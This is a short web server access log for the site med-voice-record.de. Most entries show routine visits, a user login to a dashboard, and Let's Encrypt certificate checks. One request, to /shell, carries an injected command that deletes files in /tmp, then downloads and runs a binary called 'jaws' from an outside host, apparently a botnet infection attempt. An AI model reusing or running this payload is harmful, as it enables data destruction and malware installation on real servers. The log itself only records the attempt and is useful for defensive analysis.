130.83.73.245 - - [18/Jul/2025:11:03:57 +0000] "GET / HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
118.194.228.15 - - [18/Jul/2025:11:06:31 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ scamanje.stresserit.pro/jaws;sh+/tmp/jaws" 400 493 "-" "-"
130.83.73.245 - - [18/Jul/2025:11:07:14 +0000] "GET / HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:16:34 +0000] "GET / HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:17:07 +0000] "GET / HTTP/1.1" 404 498 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:18:12 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:18:12 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://med-voice-record.de/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
188.102.178.33 - - [18/Jul/2025:11:21:39 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [18/Jul/2025:11:21:40 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://med-voice-record.de/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
130.83.73.245 - - [18/Jul/2025:11:22:31 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:22:31 +0000] "GET / HTTP/1.1" 200 2835 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
130.83.73.245 - - [18/Jul/2025:11:22:31 +0000] "GET /static/style.css HTTP/1.1" 200 1523 "http://www.med-voice-record.de/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0"
188.102.178.33 - - [18/Jul/2025:11:22:50 +0000] "GET /recording HTTP/1.1" 302 662 "http://med-voice-record.de/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [18/Jul/2025:11:22:50 +0000] "GET /login?next=%2Frecording HTTP/1.1" 200 1769 "http://med-voice-record.de/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [18/Jul/2025:11:22:56 +0000] "POST /login?next=%2Frecording HTTP/1.1" 302 705 "http://med-voice-record.de/login?next=%2Frecording" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
188.102.178.33 - - [18/Jul/2025:11:22:57 +0000] "GET /dashboards HTTP/1.1" 200 4761 "http://med-voice-record.de/login?next=%2Frecording" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0"
23.178.112.210 - - [18/Jul/2025:11:23:18 +0000] "GET /.well-known/acme-challenge/qjRE6toL4j09Ehr-vBSfuWTuuGTkvXUVOWnZI7QNjwo HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
23.178.112.210 - - [18/Jul/2025:11:23:18 +0000] "GET /.well-known/acme-challenge/JQmSwaQdTvfvspERRl1q9FPN97apsylhb6TJkDKKoiI HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
13.60.250.45 - - [18/Jul/2025:11:23:18 +0000] "GET /.well-known/acme-challenge/qjRE6toL4j09Ehr-vBSfuWTuuGTkvXUVOWnZI7QNjwo HTTP/1.1" 200 308 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
